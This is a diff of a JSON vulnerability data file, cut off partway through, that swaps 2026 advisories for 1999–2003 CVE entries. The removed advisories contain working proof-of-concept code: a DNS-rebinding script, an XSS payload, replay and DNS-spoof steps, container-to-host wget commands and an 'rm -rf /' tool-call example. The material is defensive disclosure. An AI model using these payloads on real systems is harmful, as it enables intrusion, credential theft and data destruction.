@@ -12,954 +12,851 @@
   },
   "cves": [
     {
-      "id": "CVE-2026-77339",
-      "summary": "## Summary\n\nA malicious website can use DNS rebinding to control a developer's local process-compose MCP SSE listener when MCP SSE is enabled. The vulnerable path accepts browser-origin requests before any Host validation, Origin validation, or caller-secret check, then dispatches the requests into process-compose MCP tools.\n\nThis advisory covers `https://github.com/F1bonacc1/process-compose`, confirmed at commit `d56aa59df04b72f8644811ac581a051bec05e485`.\n\nThe issue is in the MCP SSE transport, not the Gin REST API. The REST API token middleware protects REST routes, but the MCP listener is started separately and does not inherit that protection.\n\n## Affected Code\n\nRoot cause:\n\n```text\nsrc/types/mcp.go:24-30      SSE is the default MCP transport when mcp_server.transport is omitted.\nsrc/types/mcp.go:64-70      SSE configuration requires only host and port. There is no auth, Host allowlist, Origin allowlist, or caller-secret field.\nsrc/mcp/server.go:203-214   The server starts server.NewSSEServer(s.mcpServer) directly on the configured address.\nsrc/api/routes.go:32-39     X-PC-Token-Key middleware is installed on the Gin REST router, not on the MCP SSE listener.\n```\n\nImpact surface:\n\n```text\nsrc/mcp/mcp_manager.go:33-38     expose_control_tools registers built-in process-compose control tools.\nsrc/mcp/control_tools.go:26-116  The registered tools start, stop, restart, scale, read logs, search logs, and truncate logs.\nsrc/mcp/control_tools.go:121-142 The registered tools return project and process state.\n```\n\n## Reproduction\n\nStart process-compose from the affected commit with MCP SSE and built-in control tools enabled:\n\n```bash\nworkdir=\"$(mktemp -d)\"\ncd \"$workdir\"\ngit clone https://github.com/F1bonacc1/process-compose process-compose-target\ncd process-compose-target\ngit checkout d56aa59df04b72f8644811ac581a051bec05e485\n\ngo build -o ./process-compose-poc .\n\ncat > process-compose-mcp-poc.yaml <<'YAML'\nmcp_server:\n  host: 127.0.0.1\n  port: 8081\n  transport: sse\n  expose_control_tools: true\n\nprocesses:\n  sleeper:\n    command: \"sleep 600\"\n    disabled: true\nYAML\n\nPC_NO_SERVER=1 PC_DISABLE_DOTENV=1 ./process-compose-poc up \\\n  -f ./process-compose-mcp-poc.yaml \\\n  -t=false \\\n  --no-server \\\n  --keep-project \\\n  --log-file ./process-compose-mcp-poc.log\n```\n\nIn a second terminal, emulate the browser request shape produced by DNS rebinding. A real attacker page keeps `Host: attacker.example:8081` and `Origin: http://attacker.example:8081` while the hostname resolves to `127.0.0.1`. The script below sends that same request shape to the local MCP SSE listener:\n\n```bash\npython3 - <<'PY'\nimport http.client\nimport json\nimport queue\nimport threading\nimport time\nimport urllib.parse\n\nhost = \"127.0.0.1\"\nport = 8081\nattacker_host = \"attacker.example:8081\"\norigin = \"http://attacker.example:8081\"\nheaders = {\n    \"Host\": attacker_host,\n    \"Origin\": origin,\n    \"Accept\": \"text/event-stream\",\n}\n\nevents = queue.Queue()\n\ndef read_sse(resp):\n    event = None\n    data = None\n    while True:\n        line = resp.readline()\n        if not line:\n            return\n        text = line.decode(\"utf-8\", \"replace\").strip()\n        if text.startswith(\"event:\"):\n            event = text.split(\":\", 1)[1].strip()\n        elif text.startswith(\"data:\"):\n            data = text.split(\":\", 1)[1].strip()\n        elif text == \"\" and (event or data):\n            events.put((event, data))\n            event = None\n            data = None\n\nconn = http.client.HTTPConnection(host, port, timeout=10)\nconn.request(\"GET\", \"/sse\", headers=headers)\nresp = conn.getresponse()\nprint(\"GET /sse\", resp.status)\nprint(\"Access-Control-Allow-Origin:\", resp.getheader(\"Access-Control-Allow-Origin\"))\nthreading.Thread(target=read_sse, args=(resp,), daemon=True).start()\n\nendpoint = None\ndeadline = time.time() + 10\nwhile time.time() < deadline:\n    event, data = events.get(timeout=1)\n    if event == \"endpoint\":\n        endpoint = data\n        break\nassert endpoint, \"no SSE endpoint event\"\nprint(\"endpoint\", endpoint)\n\ndef post(message):\n    parsed = urllib.parse.urlparse(endpoint)\n    path = parsed.path + (\"?\" + parsed.query if parsed.query else \"\")\n    body = json.dumps(message).encode()\n    c = http.client.HTTPConnection(host, port, timeout=10)\n    c.request(\"POST\", path, body=body, headers={\n        \"Host\": attacker_host,\n        \"Origin\": origin,\n        \"Content-Type\": \"application/json\",\n        \"Content-Length\": str(len(body)),\n        \"Authorization\": \"Bearer invalid-replay-token\",\n    })\n    r = c.getresponse()\n    r.read()\n    c.close()\n    print(\"POST\", message.get(\"method\"), r.status)\n\ndef wait_result(rpc_id):\n    deadline = time.time() + 10\n    while time.time() < deadline:\n        event, data = events.get(timeout=1)\n        if event == \"message\" and data:\n            msg = json.loads(data)\n            if msg.get(\"id\") == rpc_id:\n                return msg\n    raise SystemExit(f\"no result for id {rpc_id}\")\n\npost({\n    \"jsonrpc\": \"2.0\",\n    \"id\": 1,\n    \"method\": \"initialize\",\n    \"params\": {\n        \"protocolVersion\": \"2024-11-05\",\n        \"capabilities\": {},\n        \"clientInfo\": {\"name\": \"rebind-poc\", \"version\": \"1.0.0\"}\n    }\n})\nprint(json.dumps(wait_result(1), indent=2))\n\npost({\"jsonrpc\": \"2.0\", \"method\": \"notifications/initialized\", \"params\": {}})\n\npost({\"jsonrpc\": \"2.0\", \"id\": 2, \"method\": \"tools/list\", \"params\": {}})\ntools = wait_result(2)\nnames = [tool[\"name\"] for tool in tools[\"result\"][\"tools\"]]\nprint(\"tools\", names)\n\npost({\n    \"jsonrpc\": \"2.0\",\n    \"id\": 3,\n    \"method\": \"tools/call\",\n    \"params\": {\n        \"name\": \"pc_process_list\",\n        \"arguments\": {}\n    }\n})\nprint(json.dumps(wait_result(3), indent=2))\nPY\n```\n\n## Observed Result\n\nThe MCP SSE listener accepted the forged browser-origin request shape:\n\n```text\nHost: attacker.example:8081\nOrigin: http://attacker.example:8081\nAuthorization: Bearer invalid-replay-token\n```\n\nThe server returned `GET /sse: HTTP 200` with `Access-Control-Allow-Origin: *`. The MCP session then completed `initialize`, returned the process-compose tool catalog, and allowed `tools/call` to reach a process-control handler.\n\nThe operator reproduced the issue against the genuine process-compose target and observed `pc_process_list` returning:\n\n```json\n{\n  \"data\": [\n    {\n      \"name\": \"sleeper\",\n      \"namespace\": \"default\",\n      \"status\": \"Disabled\",\n      \"system_time\": \"-\",\n      \"age\": 0,\n      \"is_ready\": \"-\",\n      \"has_ready_probe\": false,\n      \"restarts\": 0,\n      \"exit_code\": 0,\n      \"pid\": 0,\n      \"is_elevated\": false,\n      \"password_provided\": false,\n      \"mem\": 0,\n      \"cpu\": 0,\n      \"is_running\": false\n    }\n  ]\n}\n```\n\nEarlier replay against the same target also listed 13 `pc_*` MCP control tools and reached project-state and process-control calls through the SSE message endpoint.\n\n## Impact\n\nA web attacker can drive local process-compose MCP requests from the victim browser when the operator has enabled MCP SSE. The attacker does not need a bearer token, API key, cookie, client certificate, or CSRF token.\n\nWith `expose_control_tools: true`, the same unauthenticated browser-origin path can enumerate process state, read logs, search logs, truncate logs, start processes, stop processes, restart processes, and scale processes. If the operator exposes user-defined MCP process tools, the attacker can invoke those configured commands and read their output.\n\nProcess logs and process output often contain service names, local paths, usernames, runtime state, internal URLs, and secrets emitted by child processes. Start, stop, restart, scale, and log truncation are process-control operations on the developer's local process-compose project.\n\n## Suggested Fix\n\nAdd a target-side trust boundary to the MCP SSE listener before MCP dispatch:\n\n1. Reject requests whose `Host` header is not loopback or an explicit configured trusted name.\n2. Reject browser requests whose `Origin` is not a trusted loopback or configured origin.\n3. Require a random per-run bearer token or equivalent caller secret on both `/sse` and the returned `/message` endpoint.\n4. Do not rely on localhost reachability as an authentication boundary for browser-reachable HTTP transports.\n5. Consider requiring an explicit authentication setting before starting SSE MCP with process-control tools.",
-      "cvssScore": 5.1,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-306",
-        "name": "Missing Authentication for Critical Function"
-      },
-      "references": [
-        "https://github.com/F1bonacc1/process-compose/security/advisories/GHSA-5gm3-9crp-6g3v",
-        "https://github.com/F1bonacc1/process-compose/commit/6ffa74f462cd2fa4f8dc1ee63c70b793b298c858",
-        "https://github.com/F1bonacc1/process-compose/releases/tag/v1.120.0",
-        "https://github.com/advisories/GHSA-5gm3-9crp-6g3v"
-      ],
-      "vulnerableProducts": [
-        "github.com/f1bonacc1/process-compose go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-81505",
-      "summary": "## Summary\nfrain-dev/convoy (all versions up to and including v26.6.2, no patch\navailable) lets any authenticated caller who is authorized on at least one\nproject read ANY OTHER project's \"Source\" record by ID via\nGET /api/v1/projects/{projectID}/sources/{sourceID} -- regardless of whether\nthat Source actually belongs to the project named in the URL. The response\nincludes the Source's full PubSub broker configuration in plaintext\n(AMQP/Kafka/SQS/Google credentials), with no redaction.\n\n## Details\n`Handler.GetSource` (api/handlers/source.go) resolves the caller's\nauthorization against the {projectID} in the URL via retrieveProject(), then\ncalls `sources.Service.FindSourceByID(ctx, project.UID, sourceID)`\n(internal/sources/impl.go). That function accepts a projectID parameter but\nnever uses it:\n\n    func (s *Service) FindSourceByID(ctx context.Context, projectID, id string) (*datastore.Source, error) {\n        row, err := s.repo.FetchSourceByID(ctx, common.StringToPgText(id))\n        ...\n    }\n\nThe underlying SQL query (internal/sources/repo/queries.sql,\n`fetchSourceByID`) has no project_id predicate at all:\n\n    SELECT ... FROM convoy.sources AS s\n    LEFT JOIN convoy.source_verifiers sv ON s.source_verifier_id = sv.id\n    WHERE s.id = $1 AND s.deleted_at IS NULL\n\nSo the {projectID} in the URL only gates \"is the caller authorized to view\n*a* project\" -- it never re-validates that the fetched Source actually\nbelongs to that project. `LoadSourcesPaged` (the list endpoint) does\ncorrectly scope by project; only the single-item GetSource lookup is\naffected. `SourceResponse{*datastore.Source}` embeds the full database\nrecord with no redaction, so if the leaked Source is an AMQP/Kafka type, its\n`pub_sub.*.auth.password` field (a live, plaintext broker credential) is\nreturned verbatim.\n\n## Proof of Concept\n1. As a test account, create \"Victim Project\" and an AMQP Source in it\n   with a known broker password (verified against a real RabbitMQ broker,\n   not just stored -- Convoy performs a live connectivity check before\n   persisting an AMQP source).\n2. As the same or a different authenticated caller, create a completely\n   separate \"Attacker Project\".\n3. Call GET /api/v1/projects/{attacker_project_id}/sources/{victim_source_id}\n   -- i.e. a request whose URL and authorization check only ever resolve\n   the Attacker project.\n4. Verified in a Docker lab (convoy v26.6.2): the request returns 200 with\n   the Victim project's full Source object, including\n   pub_sub.amqp.auth.password matching the secret set in step 1 exactly.\n   The response's own `project_id` field is the Victim project's id, never\n   the Attacker project id used in the URL/authorization check.\n5. Negative control: an otherwise-identical request for a made-up source id\n   under the same Attacker project returns 404, confirming this is a real,\n   ID-specific hit and not a blanket-200 endpoint.\n\n(Community Edition license-gates org_limit=1/user_limit=1, so this PoC used\none account with two projects rather than two separate companies -- the\nvulnerable query performs no project-ownership check regardless of license\ntier, so a licensed multi-org deployment has the identical exposure between\ngenuinely different tenants.)\n\n<img width=\"1100\" height=\"830\" alt=\"1_live_poc_evidence\" src=\"https://github.com/user-attachments/assets/b2d18d3f-8e70-40ec-ad7f-7f0ac1fdebe0\" />\n\n## Impact\nAny authenticated user or project-scoped API key holder who has legitimate\naccess to at least one project on a Convoy instance can read any other\nproject's Source configuration by ID, including plaintext third-party\nmessage-broker credentials (AMQP/Kafka/SQS/Google PubSub). In a\nmulti-tenant deployment this is a direct cross-customer credential leak.\n\n## Fix\nAdd a project_id predicate to the fetchSourceByID query (and audit other\nsingle-item repository lookups reachable via a {projectID} route for the\nsame pattern), or re-check `source.ProjectID == project.UID` in the handler\nbefore returning the record.\n\n## Affected / Patched\nAffected: <= v26.6.2 (latest release at time of report). No patched version\navailable.",
-      "cvssScore": 7.1,
+      "id": "CVE-2002-1778",
+      "summary": "Symantec Norton Personal Firewall 2002 allows remote attackers to bypass the portscan protection by using a (1) SYN/FIN, (2) SYN/FIN/URG, (3) SYN/FIN/PUSH, or (4) SYN/FIN/URG/PUSH scan.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-639",
-        "name": "Authorization Bypass Through User-Controlled Key"
-      },
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/frain-dev/convoy/security/advisories/GHSA-p5vg-v7mj-f6q4",
-        "https://github.com/frain-dev/convoy/pull/2755",
-        "https://github.com/frain-dev/convoy/commit/1cc67cd16fb1f8890cc83a3998d3f92dceb7fd06",
-        "https://github.com/frain-dev/convoy/releases/tag/v26.6.8",
-        "https://github.com/advisories/GHSA-p5vg-v7mj-f6q4"
+        "http://online.securityfocus.com/archive/1/267850",
+        "http://securityresponse.symantec.com/avcenter/security/Content/2002.05.16.html",
+        "http://www.securityfocus.com/bid/4521",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/8859",
+        "http://online.securityfocus.com/archive/1/267850"
       ],
-      "vulnerableProducts": [
-        "github.com/frain-dev/convoy go"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-84992",
-      "summary": "### Summary\n`MdPreview` interpolates a fenced-code language into HTML attributes without escaping it. A crafted info string therefore executes JavaScript even when the shipped `XSSPlugin` is enabled.\n\n### Details\n`useMarkdownIt()` (`packages/MdEditor/layouts/Content/composition/useMarkdownIt.ts:206`) registers a `highlight` callback whose final return inserts `language` into both `class=\"language-${language}\"` and an unquoted `language=${language}` attribute without escaping. Both highlighting paths reach this return. `XSSPlugin()` filters only existing `html_block` and `html_inline` tokens before rendering, so it cannot inspect this renderer-generated HTML.\n\n### PoC\nThe Vue application enables the shipped `XSSPlugin` and renders attacker-controlled Markdown. `noHighlight: true` only makes reproduction deterministic; the default highlighting path reaches the same unsafe return. Use this as `src/main.js`:\n\n```js\nimport { createApp, h } from 'vue';\nimport { MdPreview, XSSPlugin, config } from 'md-editor-v3';\n\nconfig({ markdownItPlugins: p => [...p, { type: 'xss', plugin: XSSPlugin, options: {} }] });\nconst markdown = '```x\"><details/open/ontoggle=alert(document.domain)>\\nSAFE\\n```';\ncreateApp({ render: () => h(MdPreview,\n  { editorId: 'poc', modelValue: markdown, noHighlight: true })\n}).mount('#app');\n```\n\nCreate and run the app, replacing `src/main.js` when indicated:\n\n```sh\nnpm create vite@latest poc -- --template vue\ncd poc\nnpm install\nnpm install md-editor-v3@6.5.3\n# Replace src/main.js with the code above.\nnpm run dev\n```\n\nOpening the displayed URL automatically shows the application hostname in an alert.\n\n### Impact\nAn attacker who can supply Markdown can execute JavaScript in the application origin when a victim renders it. If the host stores that Markdown, this becomes stored XSS.\n\n### Suggested fix\nEscape `language` with `md.utils.escapeHtml` before interpolation and quote the `language` attribute. Add this payload and the raw control as regression tests with `XSSPlugin` enabled.",
-      "cvssScore": 6.1,
+      "id": "CVE-1999-0290",
+      "summary": "The WinGate telnet proxy allows remote attackers to cause a denial of service via a large number of connections to localhost.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
+      "published": "1998-02-21",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/imzbf/md-editor-v3/security/advisories/GHSA-3rm2-h79c-8qw6",
-        "https://github.com/imzbf/md-editor-v3/commit/2c07360420e74087f5bc63032ab155d93e0a0b10",
-        "https://github.com/imzbf/md-editor-v3/releases/tag/v6.5.4",
-        "https://github.com/advisories/GHSA-3rm2-h79c-8qw6"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0290",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0290"
       ],
-      "vulnerableProducts": [
-        "md-editor-v3 npm"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-63406",
-      "summary": "### Summary\nThe telemetry subsystem embeds a hardcoded auth token (`\"secret\"`) in the public source and transmits raw CLI arguments—including `--secret`, `--jwt_secret`, and `--http_rpc_secret` values—to a third-party telemetry endpoint.\n\n### Details\nIn `telemetry/config.go` line 12, `var authToken = \"secret\"` is committed in the public repository and used to authenticate to `https://telemetry.anycable.io`. In `telemetry/telemetry.go`, `clusterFingerprint()` (line 320) calls both `anycableFileConfig(c.ConfigFilePath)` (line 333), which reads the full TOML config file contents, and `anycableCLIArgs()` (line 402), which reads `os.Args[1:]` verbatim—including any `--secret=...`, `--jwt_secret=...`, `--http_rpc_secret=...` arguments. Both raw values are passed to `generateDigest()` (line 373), meaning the actual secret strings flow through the code path and are included in telemetry data sent to the third-party server. Since the hardcoded `authToken = \"secret\"` is public, any attacker who can perform DNS hijacking or is positioned on the network path can intercept and read the telemetry payload containing operator credentials.\n\n### PoC\n1. Read `telemetry/config.go` in the public repo to find `authToken = \"secret\"`.\n2. Set up a DNS spoof for `telemetry.anycable.io` pointing to an attacker-controlled server.\n3. Start anycable-go with `--secret=my-production-secret`.\n4. The server sends a POST to the attacker's endpoint with the telemetry JSON payload. The `clusterFingerprint` field contains data derived from raw `os.Args` including `--secret=my-production-secret`.\n\n### Impact\nIn MITM/DNS-hijack scenarios, production secrets (JWT secrets, broadcast keys, RPC auth) are exposed to third parties. The hardcoded `authToken = \"secret\"` provides no protection since it is known to anyone reading the open-source code.\n\n### Fix\n1. Remove the hardcoded `authToken` from source; generate or require operator configuration at build time or deployment time. 2. Remove `anycableCLIArgs()` from the fingerprint computation, or sanitize it to exclude values of secret-bearing flags before hashing. 3. Add a documented opt-out mechanism for telemetry.",
-      "cvssScore": 5.9,
+      "id": "CVE-1999-0514",
+      "summary": "UDP messages to broadcast addresses are allowed, allowing for a Fraggle attack that can cause a denial of service by flooding the target.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-312",
-        "name": "Cleartext Storage of Sensitive Information"
-      },
+      "published": "1998-03-01",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/anycable/anycable/security/advisories/GHSA-w72w-9qmj-c9qm",
-        "https://github.com/anycable/anycable/commit/201c67e99e463ed63bd6b345562f4c458385fcee",
-        "https://github.com/anycable/anycable/releases/tag/v1.6.15",
-        "https://github.com/advisories/GHSA-w72w-9qmj-c9qm"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0514",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0514"
       ],
-      "vulnerableProducts": [
-        "github.com/anycable/anycable go"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-63349",
-      "summary": "AnyIO 4.14.0 accepts the POSIX extra_groups argument on anyio.run_process() and anyio.open_process(), but open_process() forwards the wrong variable to the backend: when extra_groups is not None, it assigns kwargs[\"extra_groups\"] = group instead of extra_groups. As a result, callers cannot reliably clear or set supplementary groups for child processes. In a disposable Linux container, Python's subprocess.run(..., extra_groups=[]) clears a synthetic parent supplementary group list, while anyio.run_process(..., extra_groups=[]) preserves the parent groups. If group is also supplied, AnyIO passes an integer as extra_groups and the call fails with TypeError. This is a POSIX privilege-dropping correctness issue for applications that rely on AnyIO subprocess helpers to launch less-privileged child processes.",
-      "cvssScore": 7,
-      "severity": "High",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-266",
-        "name": "Incorrect Privilege Assignment"
-      },
+      "id": "CVE-1999-0060",
+      "summary": "Attackers can cause a denial of service in Ascend MAX and Pipeline routers with a malformed packet to the discard port, which is used by the Java Configurator tool.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-03-16",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/agronholm/anyio/security/advisories/GHSA-3w57-8xmc-8v26",
-        "https://github.com/agronholm/anyio/pull/1209",
-        "https://github.com/agronholm/anyio/commit/eb562e6462ee46b1904e50b02ce00a858cdeb200",
-        "https://github.com/agronholm/anyio/releases/tag/4.14.2",
-        "https://github.com/advisories/GHSA-3w57-8xmc-8v26"
+        "http://www.ascend.com/2695.html",
+        "http://www.ascend.com/2695.html"
       ],
-      "vulnerableProducts": [
-        "anyio pip"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-63374",
-      "summary": "### Impact\nServices using internationalized (non-ASCII) domain names are potentially vulnerable to TLS connections made from AnyIO's `connect_tcp()` or directly via `TLSStream.wrap()` where the connection has (through other means) been hijacked and redirected to a malicious server. The attacker would obtain a legitimate certificate using the IDNA 2003 encoded version of the domain name and offer it to the connecting client, making the certificate validate properly on the client's end.\n\n### Patches\nThe vulnerability will be patched in v4.14.2.\n\n### Workarounds\nEncode host names via the `idna` package prior to connecting.",
-      "cvssScore": 9.3,
-      "severity": "Critical",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-295",
-        "name": "Improper Certificate Validation"
-      },
-      "references": [
-        "https://github.com/agronholm/anyio/security/advisories/GHSA-82r6-8w77-94w6",
-        "https://github.com/agronholm/anyio/pull/1208",
-        "https://github.com/agronholm/anyio/commit/68f58915f82d9be8109ebbbd8f5d70577d43f2ce",
-        "https://github.com/agronholm/anyio/releases/tag/4.14.2",
-        "https://github.com/advisories/GHSA-82r6-8w77-94w6"
-      ],
-      "vulnerableProducts": [
-        "anyio pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-64847",
-      "summary": "### Impact\nAnyIO starts process-pool workers with stderr connected to a pipe but never drains that pipe. The worker redirects stdin and stdout to /dev/null to protect its protocol, but does not redirect stderr even though the documentation says all three standard streams are redirected. Worker code that writes enough attacker-influenced data to stderr can fill the pipe, block before returning the stdout protocol response, and wedge the awaiting process-pool call.\n\nAnyone who runs untrusted or faulty code that writes too much to `stderr` is at risk.\n\n### Patches\nThis vulnerability will be patched in v4.14.2.\n\n### Workarounds\nClosing `sys.stderr` in the target function should at least prevent the deadlock.",
+      "id": "CVE-2003-1516",
+      "summary": "The org.apache.xalan.processor.XSLProcessorVersion class in Java Plug-in 1.4.2_01 allows signed and unsigned applets to share variables, which violates the Java security model and could allow remote attackers to read or write data belonging to a signed applet.",
       "cvssScore": 6.8,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-770",
-        "name": "Allocation of Resources Without Limits or Throttling"
-      },
-      "references": [
-        "https://github.com/agronholm/anyio/security/advisories/GHSA-5p39-cfhj-2xmp",
-        "https://github.com/agronholm/anyio/pull/1207",
-        "https://github.com/agronholm/anyio/commit/f1b7301c8264b0d2e8d24a5788fd29e93dea4040",
-        "https://github.com/agronholm/anyio/releases/tag/4.14.2",
-        "https://github.com/advisories/GHSA-5p39-cfhj-2xmp"
-      ],
-      "vulnerableProducts": [
-        "anyio pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-63405",
-      "summary": "### Summary\nThe Pusher-compatible REST API includes `body_md5` in the HMAC signature string but never computes or verifies the MD5 of the received HTTP body, allowing anyone who observes a signed request to replay it with an entirely different body.\n\n### Details\nIn `pusher/http.go`, the `Handler` function extracts `body_md5` from the URL query string (line 169) and includes it verbatim in `stringToSign` (line 175). It then verifies `HMAC(stringToSign, secret) == auth_signature`. After verification succeeds, `handleEvents` reads and parses `r.Body` (lines 201-212) without ever computing `md5(body)` and comparing it against the `body_md5` that was signed. The Pusher protocol specification explicitly requires the server to verify this digest to prevent body-substitution attacks. There is also no `auth_timestamp` staleness check, so replays are valid indefinitely.\n\n### PoC\n1. Capture a legitimate signed POST to `/apps/<app_id>/events?auth_key=K&auth_timestamp=T&auth_version=1.0&body_md5=LEGIT_MD5&auth_signature=SIG` carrying body `{\"name\":\"safe-event\",\"channel\":\"ch\",\"data\":\"...\"}` (e.g., from TLS-terminating load-balancer logs).\n2. Send a new request with the same query string parameters but a different body:\n   `{\"name\":\"injected-event\",\"channel\":\"admin\",\"data\":\"malicious-payload\"}`\n3. The server accepts the request (HMAC over `stringToSign` matches the original) and broadcasts the injected event to all subscribers of `admin`.\n\n### Impact\nAn attacker who can read any single signed Pusher API request (from logs, a shared proxy, or a network tap) can broadcast arbitrary events to any channel indefinitely, potentially forging server-side events, corrupting application state, or delivering phishing messages to WebSocket clients.\n\n### Fix\nAfter reading `r.Body`, compute `hex(md5(body))` and compare it to the `body_md5` query parameter using a constant-time comparison before proceeding. Additionally, reject requests whose `auth_timestamp` is more than 600 seconds from the current time.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-345",
-        "name": "Insufficient Verification of Data Authenticity"
-      },
-      "references": [
-        "https://github.com/anycable/anycable/security/advisories/GHSA-5p54-whvp-x327",
-        "https://github.com/anycable/anycable/commit/d2cbadec792f038f4695c84a65c0d957b0fde72c",
-        "https://github.com/anycable/anycable/releases/tag/v1.6.15",
-        "https://github.com/advisories/GHSA-5p54-whvp-x327"
-      ],
-      "vulnerableProducts": [
-        "github.com/anycable/anycable go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-58197",
-      "summary": "## Summary\n\nA containerized MCP server running with the default `network` permission profile (`insecure_allow_all: true`) can reach host-local services via `host.docker.internal`. This includes the ToolHive API itself, other ToolHive-managed MCP server proxies, and any other service listening on the host's localhost. Combined with the unauthenticated ToolHive API and MCP proxy endpoints, this enables a compromised or malicious MCP server to perform lateral movement without any container escape.\n\n## Severity\n\n**High** — This bypasses the container isolation model that is ToolHive's core security value proposition.\n\n## Reproduction\n\nAll tests performed from inside the `filesystem` MCP container (`docker.io/mcp/filesystem:latest`), started with default settings via `thv run filesystem -- /tmp`.\n\n### 1. Container can reach the ToolHive control plane MCP endpoint\n\n```bash\n$ docker exec <container_id> wget -qO- \\\n  --header=\"Content-Type: application/json\" \\\n  --header=\"Accept: application/json\" \\\n  --post-data='{\"jsonrpc\":\"2.0\",\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-03-26\",\"capabilities\":{},\"clientInfo\":{\"name\":\"evil-mcp\",\"version\":\"1.0\"}},\"id\":1}' \\\n  http://host.docker.internal:50444/mcp\n```\n\n**Result:** Full MCP handshake succeeds:\n```json\n{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"protocolVersion\":\"2025-03-26\",\"capabilities\":{\"logging\":{},\"tools\":{}},\"serverInfo\":{\"name\":\"toolhive-mcp\",\"version\":\"v0.9.3\"}}}\n```\n\n### 2. Container can connect to another MCP server's proxy and call its tools\n\n```bash\n$ docker exec <container_id> wget -qO- \\\n  --header=\"Content-Type: application/json\" \\\n  --header=\"Accept: application/json\" \\\n  --post-data='{\"jsonrpc\":\"2.0\",\"method\":\"tools/list\",\"params\":{},\"id\":2}' \\\n  http://host.docker.internal:64965/mcp\n```\n\n**Result:** Returns the full tool list of the target MCP server (read_file, write_file, edit_file, move_file, etc.), and tools can be called:\n\n```json\n{\"jsonrpc\":\"2.0\",\"id\":3,\"result\":{\"content\":[{\"text\":\"Allowed directories:\\n/tmp\",\"type\":\"text\"}]}}\n```\n\n### 3. Container can reach other host services\n\n```bash\n# Kubernetes API\n$ docker exec <container_id> wget -qO- --no-check-certificate https://host.docker.internal:6443/version\n{\"major\":\"1\",\"minor\":\"34\",\"gitVersion\":\"v1.34.1\"...}\n\n# Ollama LLM API\n$ docker exec <container_id> wget -qO- http://host.docker.internal:11434/api/tags\n{\"models\":[{\"name\":\"kimi-k2:1t-cloud\"...}]}\n```\n\n## Attack Scenarios\n\n### Scenario 1: Malicious MCP server pivots to privileged native MCP tools\n\nMany users run native (non-containerized) MCP servers like Desktop Commander, terminal servers, or custom tools that have `execute_command`, `write_file`, or `shell` capabilities with full host access. These typically listen on localhost ports. A malicious containerized MCP server can:\n\n1. Port-scan `host.docker.internal` to discover listening services\n2. Attempt MCP handshakes on discovered ports\n3. Call privileged tools (e.g., `execute_command(\"rm -rf /\")` or `write_file(\"/etc/crontab\", \"...\")`)\n\nThis achieves **full host compromise without any container escape vulnerability**.\n\n### Scenario 2: Compromised MCP server manipulates ToolHive itself\n\nVia the unauthenticated ToolHive MCP endpoint on port 50444, a compromised container could potentially:\n\n- List and stop other running MCP servers (denial of service)\n- Start new MCP servers with attacker-controlled images\n- Modify configurations\n\n### Scenario 3: Data exfiltration via cross-MCP-server access\n\nA low-privilege MCP server (e.g., `sequentialthinking` with no file mounts) could reach the `filesystem` server's proxy and call `read_file` to access files it was never authorized to see.\n\n### Scenario 4: LLM model theft / abuse\n\nAs demonstrated, the container can reach Ollama's API and could enumerate models, run inference, or exfiltrate model weights from self-hosted LLMs.\n\n## Root Causes\n\n1. **`insecure_allow_all: true` as default** — permits outbound connections to any destination including `host.docker.internal`\n2. **No authentication on ToolHive API / MCP proxies** — any client that can reach the port can interact fully\n3. **Docker's `host.docker.internal` DNS** — resolves to the host machine, bypassing localhost-only binding assumptions\n\n## Suggested Mitigations\n\n### Short-term\n\n- **Block `host.docker.internal` and `172.17.0.1`** (Docker gateway) in container networking by default, even when `insecure_allow_all` is enabled. These should require explicit opt-in.\n- **Add authentication to MCP proxy endpoints** — even a shared secret or token per session would prevent cross-container lateral movement.\n\n### Medium-term\n\n- **Network policy per container** — ToolHive already has the `permission_profile` infrastructure. Add support for explicit allow-lists rather than just the binary none/all choice.\n- **Isolate container networks** — run each MCP server in its own Docker network with no access to the Docker bridge gateway.\n\n### Long-term\n\n- **Mutual TLS or token-based auth** between ToolHive proxy and containers, so even if network access exists, unauthorized MCP calls are rejected.\n- **Audit logging** — log all MCP tool calls with source identification so lateral movement attempts are visible.\n\n## 